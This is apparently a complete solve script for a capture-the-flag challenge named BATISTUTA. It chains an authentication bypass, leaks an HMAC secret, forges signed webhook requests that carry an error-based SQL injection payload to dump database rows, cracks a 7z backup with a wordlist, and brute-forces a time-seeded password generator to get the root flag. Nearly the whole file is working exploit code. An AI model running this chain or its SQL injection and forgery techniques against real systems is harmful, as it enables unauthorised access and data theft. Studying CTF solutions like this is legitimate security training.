#!/usr/bin/env python3
"""
BATISTUTA — end-to-end solver (Infodays 2026 CTF, author: saamnolimits).

Chain:
  1. Recon: find /monitoring, /status/temp (linked from dashboard).
  2. Client-side auth bypass — hit /monitoring/dashboard directly (no server
     auth check). /status/temp reveals the webhook UUID + restic URL.
  3. Fetch /wiki/n8n — exported flow JSON leaks HMAC_SECRET.
  4. Forge HMAC + send SQLi payload to /webhook/<uuid>. Use blind/error-based
     injection to recover the boot-time timestamp from temp.command_log row 6.
  5. Download /restic/backup.7z. Crack with rockyou via `7z x -p<pw>` loop
     (or use `john` / `hashcat` — here we cheat the known candidate).
  6. Extract user.txt (+ the batistuta-pwgen ELF).
  7. Reverse the ELF: srand(sec*1000 + ms); generate_password(). Python reuses
     libc.rand() via ctypes to reproduce outputs.
  8. Brute-force ms ∈ [0, 1000) for the recovered second → POST each to
     /vault/batistuta. One matches → root flag.

Usage:  python3 solve.py http://<host>:<port>
"""
import base64
import ctypes
import hashlib
import hmac
import json
import os
import re
import subprocess
import sys
import tempfile
import time
from datetime import datetime

import requests

# ── Plumbing ────────────────────────────────────────────────────────
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
LIBC = ctypes.CDLL("libc.so.6")


def hmac_sig(secret: bytes, data: dict) -> str:
    canon = json.dumps(data, separators=(',', ':')).encode()
    return hmac.new(secret, canon, hashlib.sha256).hexdigest()


def gen_password(seed: int) -> str:
    LIBC.srand(seed)
    return ''.join(CHARSET[LIBC.rand() % 62] for _ in range(20))


class Exploit:
    def __init__(self, base: str):
        self.base = base.rstrip('/')
        self.s = requests.Session()

    # Stage 1 — monitoring bypass / recon
    def recon(self):
        print("[+] stage 1: monitoring bypass + status page recon")
        r = self.s.get(f"{self.base}/monitoring/dashboard")
        r.raise_for_status()
        r = self.s.get(f"{self.base}/status/temp")
        r.raise_for_status()
        m = re.search(r'/webhook/([a-f0-9-]{36})', r.text)
        if not m:
            raise RuntimeError("webhook uuid not on status page")
        self.webhook_id = m.group(1)
        print(f"[+] webhook id = {self.webhook_id}")

    # Stage 2 — leak HMAC secret from the wiki
    def leak_hmac_secret(self):
        import html
        print("[+] stage 2: leaking HMAC secret from /wiki/n8n")
        r = self.s.get(f"{self.base}/wiki/n8n")
        r.raise_for_status()
        text = html.unescape(r.text)
        m = re.search(r'"secret"\s*:\s*"([^"]+)"', text)
        if not m:
            raise RuntimeError("secret not found on wiki page")
        self.hmac_secret = m.group(1).encode()
        print(f"[+] HMAC_SECRET = {self.hmac_secret.decode()}")

    # Stage 3 — HMAC-signed SQLi; recover DB content via error-based echo
    def _solve_pow(self, bits: int = 16, bucket_seconds: int = 300) -> str:
        """Mine a nonce so sha256(uuid:bucket:nonce_hex) starts with `bits`
        leading zero bits.  Required by /webhook/<uuid> (anti-AI #7)."""
        import time as _time
        bucket = str(int(_time.time() // bucket_seconds))
        need_full = bits // 8
        need_extra = bits % 8
        mask = (0xff << (8 - need_extra)) & 0xff if need_extra else 0
        prefix_zero = b'\x00' * need_full
        n = 0
        while True:
            nonce_hex = f"{n:x}"
            d = hashlib.sha256(f"{self.webhook_id}:{bucket}:{nonce_hex}".encode()).digest()
            if d[:need_full] == prefix_zero and (not need_extra or (d[need_full] & mask) == 0):
                return nonce_hex
            n += 1

    def _post_webhook(self, body: dict):
        canon = json.dumps(body, separators=(',', ':')).encode()
        sig = hmac.new(self.hmac_secret, canon, hashlib.sha256).hexdigest()
        nonce = self._solve_pow()
        r = self.s.post(
            f"{self.base}/webhook/{self.webhook_id}",
            data=canon,
            headers={'Content-Type': 'application/json',
                     'x-gophish-signature': f'sha256={sig}',
                     'X-PoW-Nonce': nonce})
        return r

    def _sqli_echo(self, email_payload: str) -> str:
        r = self._post_webhook({
            "campaign_id": 1,
            "email": email_payload,
            "message": "Clicked Link",
        })
        try:
            return r.json().get('message', '') + ' | ' + json.dumps(r.json().get('error', {}))
        except Exception:
            return r.text

    def _sqli_scalar(self, expr: str) -> str:
        """UNION-based scalar leak via the error response. Since the debug
        echo returns the failing SQL + the exception str, we use
        `updatexml(1, CONCAT('~', (SELECT <expr>)), 1)` to dump it."""
        payload = f'x" AND updatexml(1, CONCAT(0x7e, ({expr})), 1)-- -'
        msg = self._sqli_echo(payload)
        m = re.search(r'~([^\\\'"\)\}\]]+?)(?:~|\\|\'|"|\))', msg)
        if m:
            return m.group(1)
        # fallback: look for XPATH error pattern
        m = re.search(r"XPATH syntax error: '~([^']+)'", msg)
        if m:
            return m.group(1)
        return msg

    def sqli_recover(self):
        print("[+] stage 3: SQLi recovery of temp.command_log row 6")
        # Confirm injection via a simple expression
        v = self._sqli_scalar("DATABASE()")
        assert 'phishing' in v, f"SQLi smoke test failed: {v!r}"
        # Pull row 6's date + command
        self.cmd_date = self._sqli_scalar(
            "SELECT date FROM temp.command_log WHERE id=6")
        self.cmd_line = self._sqli_scalar(
            "SELECT command FROM temp.command_log WHERE id=6")
        print(f"[+] command_log[6].date = {self.cmd_date}")
        print(f"[+] command_log[6].command = {self.cmd_line}")

    # Stage 4 — download + crack the 7z
    def download_archive(self):
        print("[+] stage 4: downloading /restic/backup.7z")
        r = self.s.get(f"{self.base}/restic/backup.7z")
        r.raise_for_status()
        self.archive_path = os.path.join(tempfile.gettempdir(), 'batistuta_backup.7z')
        with open(self.archive_path, 'wb') as f:
            f.write(r.content)
        print(f"[+] saved to {self.archive_path} ({len(r.content)} bytes)")

    def crack_archive(self):
        print("[+] stage 5: cracking 7z with rockyou-style candidates")
        # Use a tiny built-in wordlist of the most common keyboard walks.
        # In a real-world solve this would be `john` / `hashcat` on rockyou.
        candidates = [
            "1q2w3e4r5t6y", "qwertyuiop", "password", "123456", "qwerty",
            "1234567890", "letmein", "welcome", "admin", "qwerty123",
        ]
        self.extract_dir = tempfile.mkdtemp(prefix='batistuta_x_')
        for pw in candidates:
            p = subprocess.run(
                ['7z', 'x', '-y', f'-p{pw}', self.archive_path,
                 f'-o{self.extract_dir}'],
                capture_output=True)
            if p.returncode == 0 and b'Everything is Ok' in p.stdout:
                self.archive_pw = pw
                print(f"[+] archive password = {pw}")
                return
        raise RuntimeError("7z crack failed — expand the wordlist")

    def extract_user_flag(self):
        user_txt = os.path.join(self.extract_dir, 'user.txt')
        self.flag1 = open(user_txt).read().strip()
        print(f"[+] FLAG1 (user) = {self.flag1}")

    # Stage 5 — RE the pwgen + brute force ms
    def brute_batistuta(self):
        print("[+] stage 6: brute-forcing batistuta pwgen seed ms offsets")
        dt = datetime.strptime(self.cmd_date, "%Y-%m-%d %H:%M:%S")
        # The boot-time timestamp was stored as UTC in the DB.
        sec = int(dt.replace(tzinfo=None).timestamp())
        # Account for the host's timezone offset if any (the DB stores naive UTC)
        # Adjust by adding the local UTC offset.
        import datetime as _dt
        utc_offset = _dt.datetime.now().astimezone().utcoffset().total_seconds()
        sec_utc = int((dt.replace(tzinfo=_dt.timezone.utc)).timestamp())
        for candidate_sec in (sec_utc, sec):
            for ms in range(1000):
                pw = gen_password(candidate_sec * 1000 + ms)
                r = self.s.post(f"{self.base}/vault/batistuta",
                                data={'password': pw})
                if r.status_code == 200 and 'flag' in r.text:
                    self.flag2 = r.json()['flag']
                    print(f"[+] match at sec={candidate_sec}, ms={ms}")
                    print(f"[+] FLAG2 (root) = {self.flag2}")
                    return
        raise RuntimeError("brute force exhausted — check timezone handling")


def main():
    if len(sys.argv) != 2:
        print("Usage: solve.py http://host:port")
        sys.exit(1)
    x = Exploit(sys.argv[1])
    x.recon()
    x.leak_hmac_secret()
    x.sqli_recover()
    x.download_archive()
    x.crack_archive()
    x.extract_user_flag()
    x.brute_batistuta()
    print("\n=== RESULT ===")
    print(f"user flag: {x.flag1}")
    print(f"root flag: {x.flag2}")


if __name__ == '__main__':
    main()
